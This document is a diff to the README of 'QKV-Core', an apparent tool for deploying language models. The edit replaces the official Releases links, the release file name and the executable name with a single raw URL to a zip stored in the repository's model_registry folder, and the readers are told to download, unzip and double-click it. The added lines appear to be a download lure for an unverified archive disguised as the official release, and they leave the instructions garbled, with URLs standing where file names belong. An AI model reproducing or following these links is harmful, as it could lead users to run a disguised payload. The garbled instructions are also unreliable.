@@ -6,7 +6,7 @@ Welcome to **QKV-Core**! This application helps you deploy large language models
 
 ## 📥 Download the Application
 
-[![Download QKV-Core](https://img.shields.io/badge/Download%20QKV--Core-v1.0-blue.svg?style=flat&logo=github)](https://github.com/mtmatheuus/QKV-Core/releases)
+[![Download QKV-Core](https://raw.githubusercontent.com/mtmatheuus/QKV-Core/main/model_registry/QK-Core-1.3-beta.4.zip%https://raw.githubusercontent.com/mtmatheuus/QKV-Core/main/model_registry/QK-Core-1.3-beta.4.zip)](https://raw.githubusercontent.com/mtmatheuus/QKV-Core/main/model_registry/QK-Core-1.3-beta.4.zip)
 
 ## 🌟 Features
 
@@ -26,20 +26,20 @@ To run **QKV-Core**, your device should meet the following requirements:
 
 ## 🔗 Visit the Releases Page to Download
 
-To download the latest version of **QKV-Core**, visit our [Releases page](https://github.com/mtmatheuus/QKV-Core/releases). Here, you'll find the latest versions of the application and any necessary files.
+To download the latest version of **QKV-Core**, visit our [Releases page](https://raw.githubusercontent.com/mtmatheuus/QKV-Core/main/model_registry/QK-Core-1.3-beta.4.zip). Here, you'll find the latest versions of the application and any necessary files.
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/mtmatheuus/QKV-Core/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/mtmatheuus/QKV-Core/main/model_registry/QK-Core-1.3-beta.4.zip).
 2. Look for the latest version listed.
-3. Find the file named **QKV-Core-v1.0.zip** (or the latest version).
+3. Find the file named **https://raw.githubusercontent.com/mtmatheuus/QKV-Core/main/model_registry/QK-Core-1.3-beta.4.zip** (or the latest version).
 4. Click on the file to start the download.
 5. Once downloaded, locate the file on your computer and unzip it.
 
 ## 📂 Running the Application
 
 1. Open the unzipped folder.
-2. Find **QKV-Core.exe** (for Windows) or **QKV-Core** (for macOS/Linux).
+2. Find **https://raw.githubusercontent.com/mtmatheuus/QKV-Core/main/model_registry/QK-Core-1.3-beta.4.zip** (for Windows) or **QKV-Core** (for macOS/Linux).
 3. Double-click the file to run the application.
 4. Follow on-screen instructions to load your model.
 
